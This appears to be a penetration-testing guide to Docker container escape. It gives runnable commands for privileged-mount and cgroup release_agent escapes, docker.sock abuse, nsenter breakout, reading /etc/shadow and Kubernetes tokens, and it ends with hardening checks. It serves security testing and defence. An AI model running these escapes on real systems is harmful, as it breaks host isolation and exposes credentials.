# Docker Container Escape Techniques Guide

> Methodology for testing container isolation boundaries, identifying escape vectors, and validating container security controls.

---

## 1. Container Escape Vectors

### Privileged Container Escape

```bash
# Check if running in privileged mode
cat /proc/self/status | grep -i "capeff"
# Full capabilities = 0000003fffffffff (privileged)

# Mount host filesystem from privileged container
mkdir /mnt/host
mount /dev/sda1 /mnt/host
ls /mnt/host/etc/shadow

# Access host via cgroups (CVE-2022-0492 pattern)
mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp
echo 1 > /tmp/cgrp/notify_on_release
host_path=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)
echo "$host_path/cmd" > /tmp/cgrp/release_agent
echo '#!/bin/sh' > /cmd && echo "id > /output" >> /cmd && chmod +x /cmd
```

### Docker Socket Escape

```bash
# If docker.sock is mounted
ls -la /var/run/docker.sock

# Create privileged container from within container
curl -s --unix-socket /var/run/docker.sock \
  -X POST "http://localhost/containers/create" \
  -H "Content-Type: application/json" \
  -d '{"Image":"alpine","Cmd":["/bin/sh"],"HostConfig":{"Privileged":true,"Binds":["/:/host"]}}'

# Using docker CLI if available
docker run -v /:/host --privileged -it alpine chroot /host
```

### Kernel Exploit Escape

```bash
# Check kernel version for known container escapes
uname -r

# Known escape CVEs to check:
# CVE-2022-0185 (fsconfig heap overflow)
# CVE-2022-0847 (Dirty Pipe)
# CVE-2021-22555 (Netfilter)
# CVE-2020-14386 (AF_PACKET)

# Check available kernel modules
cat /proc/modules | head -20
```

---

## 2. Capability Analysis

### Capability Enumeration

```bash
# List current capabilities
capsh --print

# Check specific dangerous capabilities
getpcaps $$

# Dangerous capabilities for escape:
# CAP_SYS_ADMIN — mount filesystems, access /proc
# CAP_SYS_PTRACE — trace any process
# CAP_NET_ADMIN — network namespace manipulation
# CAP_DAC_OVERRIDE — bypass file permissions
# CAP_SYS_MODULE — load kernel modules

# Check if we can load kernel modules
capsh --has-p=cap_sys_module && echo "CAN LOAD MODULES"
```

### Namespace Breakout

```bash
# Check namespace isolation
ls -la /proc/1/ns/
readlink /proc/1/ns/pid
readlink /proc/self/ns/pid

# If sharing PID namespace with host
ls /proc/*/cmdline 2>/dev/null | head -20

# nsenter to host namespaces (requires CAP_SYS_ADMIN)
nsenter --target 1 --mount --uts --ipc --net --pid -- /bin/bash
```

---

## 3. Container Detection

### Am I In a Container?

```bash
# Multiple detection methods
detect_container() {
    # Method 1: cgroup
    grep -q "docker\|lxc\|kubepods" /proc/1/cgroup 2>/dev/null && echo "CONTAINER (cgroup)"
    
    # Method 2: .dockerenv
    [ -f /.dockerenv ] && echo "CONTAINER (.dockerenv)"
    
    # Method 3: init process
    [ "$(cat /proc/1/sched 2>/dev/null | head -1)" != "systemd" ] && echo "CONTAINER (init)"
    
    # Method 4: limited devices
    [ $(ls /dev/ | wc -l) -lt 20 ] && echo "CONTAINER (limited /dev)"
}
detect_container
```

### Container Metadata Extraction

```bash
# Get container ID
cat /proc/self/cgroup | grep -oP '[a-f0-9]{64}' | head -1

# Get image info
cat /proc/self/mountinfo | grep "overlay" | head -1

# Check environment for orchestrator info
env | grep -iE "KUBERNETES|DOCKER|MESOS|ECS"

# Check for service account tokens (Kubernetes)
ls /var/run/secrets/kubernetes.io/serviceaccount/ 2>/dev/null
cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null
```

---

## 4. Defense Validation

### Security Control Testing

```bash
# Test seccomp profile
# Try blocked syscalls
python3 -c "import os; os.unshare(0)" 2>&1 | grep -q "Operation not permitted" && echo "seccomp: ACTIVE"

# Test AppArmor
cat /proc/self/attr/current 2>/dev/null

# Test read-only filesystem
touch /test_write 2>&1 | grep -q "Read-only" && echo "rootfs: READ-ONLY"

# Test network restrictions
curl -s http://169.254.169.254/ 2>&1 | grep -q "Connection refused\|timed out" && echo "metadata: BLOCKED"
```

### Hardening Verification Checklist

```bash
#!/bin/bash
echo "=== Container Hardening Check ==="
echo -n "Non-root user: "; [ "$(id -u)" -ne 0 ] && echo "PASS" || echo "FAIL"
echo -n "Read-only rootfs: "; touch /tmp_test 2>/dev/null && echo "FAIL" && rm /tmp_test || echo "PASS"
echo -n "No capabilities: "; [ "$(cat /proc/self/status | grep CapEff | awk '{print $2}')" = "0000000000000000" ] && echo "PASS" || echo "FAIL"
echo -n "No docker.sock: "; [ ! -S /var/run/docker.sock ] && echo "PASS" || echo "FAIL"
echo -n "Seccomp active: "; grep -q "Seccomp.*2" /proc/self/status && echo "PASS" || echo "FAIL"
```
